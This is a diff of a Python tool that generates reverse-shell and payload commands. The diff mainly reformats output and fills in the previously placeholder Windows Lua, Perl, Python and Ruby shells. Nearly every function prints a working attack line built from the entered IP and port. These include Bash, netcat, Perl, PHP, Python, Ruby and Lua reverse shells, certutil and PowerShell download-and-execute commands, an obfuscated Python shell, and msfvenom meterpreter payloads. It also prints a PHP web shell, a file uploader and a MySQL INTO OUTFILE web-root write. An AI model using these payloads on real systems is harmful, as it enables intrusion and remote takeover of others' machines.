@@ -52,7 +52,7 @@ sub_banner = f"""{c.d}
                             {c.k}░░░░░░░░░░{c.d}          ███████]▄▄▄▄▄▄▄▄{c.k}--------{c.n}●
                                 {c.k}░░░░░{c.d}      ▂▂▄▅█████████▅▄▃▂          
                                     {c.k}░░░░░{c.d}  ███████████████████].    {c.k}
-                                      ░░░░░◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤..     
+                                      ░░░░░◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤..     
 """
 
 
@@ -63,14 +63,14 @@ sub_banner = f"""{c.d}
 def menu():                     # The menu function displays the banner, menu options, and validates user input from available options.
     print(banner + sub_banner)  # Prints the banner and sub_banner variables to the terminal.
     # The below print statement prints out the Linux Menu options to the terminal.
-    print(f"{c.w}\nLinux Menu: \n\t1.{c.p} Bash\t\t\t   {c.w}2. {c.p}Java\t\t\t   {c.w}3. {c.p}Netcat\n\t{c.w}4. {c.p}Netcat Alt\t\t{c.w}        5. {c.p}Perl\t  {c.w}\t\t     6. {c.p}PHP\n\t{c.w}7. {c.p}Python\t{c.w}\t\t     8. {c.p}Ruby\n{c.n}")
+    print(f"{c.w}\nLinux Menu: \n\t1.{c.p} Bash\t\t\t    {c.w}2. {c.p}Java\t\t        {c.w}3. {c.p}Netcat\n\t{c.w}4. {c.p}Netcat Alt\t\t{c.w}    5. {c.p}Perl\t  {c.w}\t\t6. {c.p}PHP\n\t{c.w}7. {c.p}Python\t{c.w}\t    8. {c.p}Ruby\n{c.n}")
     # The below print statement prints out the Windows Menu options to the terminal.
-    print(f"{c.w}\nWindows Menu: \n\t9. {c.c}Certutil\t\t   {c.w}10. {c.c}Lua\t\t\t   {c.w}11. {c.c}Perl\n\t{c.w}12. {c.c}Powercat\t{c.w}\t\t     13. {c.c}Powershell\t {c.w}\t     14. {c.c}Python\n\t{c.w}15. {c.c}Ruby\n{c.n}")
+    print(f"{c.w}\nWindows Menu: \n\t 9. {c.c}Certutil\t\t   {c.w}10. {c.c}Lua\t\t       {c.w}11. {c.c}Perl\n\t{c.w}12. {c.c}Powercat\t{c.w}\t   13. {c.c}Powershell\t {c.w}      14. {c.c}Python\n\t{c.w}15. {c.c}Ruby\n{c.n}")
     # The below print statement prints out the MSFVenom Menu options to the terminal.
-    print(f"{c.w}\nMSFVenom Linux Menu: \n[x86]\n\t{c.w}16. {c.r}Meterpreter-Bind(S)\t{c.w}17. {c.r}Meterpreter-Reverse(S)\t{c.w}18. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}19. {c.r}Shell-Reverse(SL)\t\t{c.w}20. {c.r}Shell-Reverse(S)\t\t{c.w}21. {c.r}Shell-Bind(SL)\t\t{c.w}\n\t22. {c.r}Shell-Bind(S)\n\n{c.n}")
-    print(f"{c.w}\n[x64]\n\t{c.w}23. {c.r}Meterpreter-Bind(S)\t{c.w}24. {c.r}Meterpreter-Reverse(S)\t{c.w}25. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}26. {c.r}Shell-Reverse(SL)\t        {c.w}27. {c.r}Shell-Reverse(S)\t\t{c.w}28. {c.r}Shell-Bind(SL)\t\t\n\t{c.w}29. {c.r}Shell-Bind(S)\n\n{c.n}")
-    print(f"{c.w}\nMSFVenom Windows Menu: \n\t{c.w}30. {c.l}Reverse Powershell\t{c.w}31. {c.l}Reverse Lua\t\t {c.w}32. {c.l}Reverse Perl\n\t{c.w}33. {c.l}Reverse Ruby\t\t{c.w}34. {c.l}Bind Powershell\t\t {c.w}35. {c.l}Bind Lua\n\t{c.w}36. {c.l}Bind Perl\t\t\t{c.w}37. {c.l}Bind Ruby\n\n{c.n}")
-    print(f"{c.w}\nMisc. Menu: \n\t{c.w}38. {c.m}War\t\t\t{c.w}39. {c.m}Web Uploader\t\t {c.w}40. {c.m}Web Shell\n\t{c.w}41. {c.m}MySQL Uploader\n\n\t\t\t\t      {c.w} 0. Exit{c.n}")
+    print(f"{c.w}\nMSFVenom Linux Menu: \n[x86]\n\t{c.w}16. {c.r}Meterpreter-Bind(S)\t   {c.w}17. {c.r}Meterpreter-Reverse(S)  {c.w}18. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}19. {c.r}Shell-Reverse(SL)\t   {c.w}20. {c.r}Shell-Reverse(S)\t       {c.w}21. {c.r}Shell-Bind(SL)\t\t{c.w}\n\t22. {c.r}Shell-Bind(S)\n\n{c.n}")
+    print(f"{c.w}\n[x64]\n\t{c.w}23. {c.r}Meterpreter-Bind(S)\t   {c.w}24. {c.r}Meterpreter-Reverse(S)  {c.w}25. {c.r}Meterpreter-Reverse(SL)\n\t{c.w}26. {c.r}Shell-Reverse(SL)\t   {c.w}27. {c.r}Shell-Reverse(S)\t{c.w}       28. {c.r}Shell-Bind(SL)\t\t\n\t{c.w}29. {c.r}Shell-Bind(S)\n\n{c.n}")
+    print(f"{c.w}\nMSFVenom Windows Menu: \n\t{c.w}30. {c.l}Reverse Powershell\t   {c.w}31. {c.l}Reverse Lua\t       {c.w}32. {c.l}Reverse Perl\n\t{c.w}33. {c.l}Reverse Ruby\t   {c.w}34. {c.l}Bind Powershell\t       {c.w}35. {c.l}Bind Lua\n\t{c.w}36. {c.l}Bind Perl\t\t   {c.w}37. {c.l}Bind Ruby\n\n{c.n}")
+    print(f"{c.w}\nMisc. Menu: \n\t{c.w}38. {c.m}War\t\t\t   {c.w}39. {c.m}Web Uploader\t       {c.w}40. {c.m}Web Shell\n\t{c.w}41. {c.m}MySQL Uploader\n\n\t\t\t\t      {c.w} 0. Exit{c.n}")
     u_input = input(f"{c.g}\nSelect an option{c.n}: ")        # User input for Menu Selection
     
 
@@ -350,7 +350,7 @@ def web_extensions():
     while True:
         try:
             print(f"\n\n{c.m}Web Extensions:")
-            print(f"{c.w}Extension file name examples: {c.m}html, jsp, php, php3, php5, pht{c.n}")
+            print(f"{c.w}Extension file name examples: {c.m}html, jsp, php, php3, php5, pht{c.n}\n")
             extension = str(input(f"{c.a}Enter an extension file name{c.n}: ").replace(" ",""))
             if not extension:
                 raise ValueError('empty string')
@@ -364,198 +364,198 @@ def web_extensions():
 
 # Begin Linux Menu Functions.
 def bash(ip, port):
-    print(f"\n{c.g}[+] {c.p}bash -i >& /dev/tcp/{ip}/{port} 0>&1")            # Syntax output for Bash reverse shell.
+    print(f"\n{c.g}[+] {c.p}bash -i >& /dev/tcp/{ip}/{port} 0>&1{c.n}\n")            # Syntax output for Bash reverse shell.
     exit(0)                                                                 # Conducts a clean exit of the program.
                     
         
 def java(ip, port):
     print(f"""\n{c.g}[+] {c.p}r = Runtime.getRuntime()""")
     print(f"""{c.g}[+] {c.p}p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])""")
-    print(f"{c.g}[+] {c.p}p.waitFor()")
+    print(f"{c.g}[+] {c.p}p.waitFor(){c.n}\n")
     exit(0)
 
 
 def netcat(ip, port):
-    print(f"""\n{c.g}[+] {c.p}nc -e /bin/sh {ip} {port}""")
+    print(f"""\n{c.g}[+] {c.p}nc -e /bin/sh {ip} {port}{c.n}\n""")
     exit(0)
 
 
 def netcat_alt(ip, port):
-    print(f"""\n{c.g}[+] {c.p}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f""")
+    print(f"""\n{c.g}[+] {c.p}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f{c.n}\n""")
     exit(0)
 
 
 def perl(ip, port):
-    print(f"""\n{c.g}[+] {c.p}perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""")
+    print(f"""\n{c.g}[+] {c.p}perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'{c.n}\n""")
     exit(0)
 
 
 def php(ip, port):
-    print(f"""\n{c.g}[+] {c.p}php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""")
+    print(f"""\n{c.g}[+] {c.p}php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'{c.n}\n""")
     exit(0)
 
 
 def python(ip, port):
-    print(f"""\n{c.g}[+] {c.p}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""")
+    print(f"""\n{c.g}[+] {c.p}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'{c.n}\n""")
     exit(0)
 
 
 def ruby(ip, port):
-    print(f"""\n{c.g}[+] {c.p}ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
+    print(f"""\n{c.g}[+] {c.p}ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'{c.n}\n""")
     exit(0)
 
 
 # Start of Window's Menu Functions.
 def certutil(ip, port, payload, newPayload):
-    print(f"""\n{c.g}[+] {c.c}certutil -urlcache -split -f http://{ip}:{port}/{payload} {newPayload}""")
+    print(f"""\n{c.g}[+] {c.c}certutil -urlcache -split -f http://{ip}:{port}/{payload} {newPayload}{c.n}\n""")
     exit(0)
 
 
 def lua(ip, port):
-    print(f"""\n{c.g}[+] {c.c}nc -e /bin/sh {ip} {port}""")
+    print(f"""\n{c.g}[+] {c.c}lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'{c.n}\n""")
     exit(0)
 
 
 def perl_win(ip, port):
-    print(f"""\n{c.g}[+] {c.c}nc -e /bin/sh {ip} {port}""")
+    print(f"""\n{c.g}[+] {c.c}perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'{c.n}\n""")
     exit(0)
 
 
 def powercat(ip, port):
-    print(f"""\n{c.g}[+] {c.c}powercat -c {ip} -p {port} -e cmd""")
+    print(f"""\n{c.g}[+] {c.c}powercat -c {ip} -p {port} -e cmd{c.n}\n""")
     exit(0)
 
 
 def powershell(ip, port, payload):
-    print(f"""\n{c.g}[+] {c.c}powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/{payload}')" """)
+    print(f"""\n{c.g}[+] {c.c}powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/{payload}')" {c.n}\n""")
     exit(0)
 
 
 def python_win(ip, port):
-    print(f"""\n{c.g}[+] {c.c}nc -e /bin/sh {ip} {port}""")
+    print(f"""\n{c.g}[+] {c.c}C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{ip}', {port})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}})(), type('try', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]}})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib')){c.n}\n""")
     exit(0)
 
 
 def ruby_win(ip, port):  
-    print(f"""\n{c.g}[+] {c.c}nc -e /bin/sh {ip} {port}""")
+    print(f"""\n{c.g}[+] {c.c}ruby -rsocket -e 'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'{c.n}\n""")
     exit(0)
 
 
 # Start of MSFVenom Linux x86 functions.
 def meterpreter_bind_s(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def meterpreter_reverse_s(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def meterpreter_reverse_sl(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def shell_reverse_sl(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def shell_reverse_s(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def shell_bind_sl(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 def shell_bind_s(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}""")
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x86/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload}{c.n}\n""")
     exit(0)
 
 
 # Start of MSFVenom Linux x86_64 functions.
 def meterpreter_bind_s64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def meterpreter_reverse_s64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def meterpreter_reverse_sl64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def shell_reverse_sl64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def shell_reverse_s64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def shell_bind_sl64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def shell_bind_s64(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/shell/bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 # Start of MSFVenom Windows functions
 def msfvenom_powershell(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/ LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p linux/x64/meterpreter/ LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_lua(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_lua LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_lua LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_perl(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_perl LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_perl LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_ruby(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/reverse_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_psB(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/powershell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/powershell_bind_tcp LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_luaB(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_lua LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_lua LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 def msfvenom_perlB(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_perl LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_perl LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 def msfvenom_rubyB(ip, port, formats, payload):
-    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} """)
+    print(f"""\n{c.g}[+] {c.l}msfvenom -p cmd/windows/bind_ruby LHOST={ip} LPORT={port} -f {formats} > {payload} {c.n}\n""")
     exit(0)
 
 
 # Start of Misc. Menu Functions
 def war(ip, port, payload):
-    print(f"""\n{c.g}[+] {c.m}msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > {payload}.war""")
+    print(f"""\n{c.g}[+] {c.m}msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > {payload}.war{c.n}\n""")
     exit(0)
 
 
@@ -586,17 +586,17 @@ def web_uploader():
         echo "There was an error uploading the file, please try again!";
     }}
   }}
-?>""")
+?>{c.n}\n""")
     exit(0)
 
 
 def web_shell():
-    print(f"""\n{c.g}[+] {c.m}<?php system($_GET['cmd']); ?>""")
+    print(f"""\n{c.g}[+] {c.m}<?php system($_GET['cmd']); ?>{c.n}\n""")
     exit(0)
 
 
 def mysql_uploader():
-    print(f"""{c.g}[+] {c.m}SELECT\n"<?php echo \\'<form action=\\"\\" method=\\"post\\" enctype=\\"multipart/form-data\\" name=\\"uploader\\" id=\\"uploader\\">\\';echo \\'<input type=\\"file\\" name=\\"file\\" size=\\"50\\"><input name=\\"_upl\\" type=\\"submit\\" id=\\"_upl\\" value=\\"Upload\\"><form>\\'; $_upl = @$_POST[\\'_upl\\']; if(isset($_upl)) {{if(@copy($_FILES[\\'file\\'][\\'tmp_name\\'], $_FILES[\\'file\\'][\\'name\\'])) {{ echo \\'<b>Upload Done<b><br><br>\\'; }}else {{echo \\'<b>Upload Failed</b><br><br>\\';}}?>"\nINTO OUTFILE 'C:/var/www/html/uploader.php';""")
+    print(f"""{c.g}[+] {c.m}SELECT\n"<?php echo \\'<form action=\\"\\" method=\\"post\\" enctype=\\"multipart/form-data\\" name=\\"uploader\\" id=\\"uploader\\">\\';echo \\'<input type=\\"file\\" name=\\"file\\" size=\\"50\\"><input name=\\"_upl\\" type=\\"submit\\" id=\\"_upl\\" value=\\"Upload\\"><form>\\'; $_upl = @$_POST[\\'_upl\\']; if(isset($_upl)) {{if(@copy($_FILES[\\'file\\'][\\'tmp_name\\'], $_FILES[\\'file\\'][\\'name\\'])) {{ echo \\'<b>Upload Done<b><br><br>\\'; }}else {{echo \\'<b>Upload Failed</b><br><br>\\';}}?>"\nINTO OUTFILE 'C:/var/www/html/uploader.php';{c.n}\n""")
     exit(0)
 
 
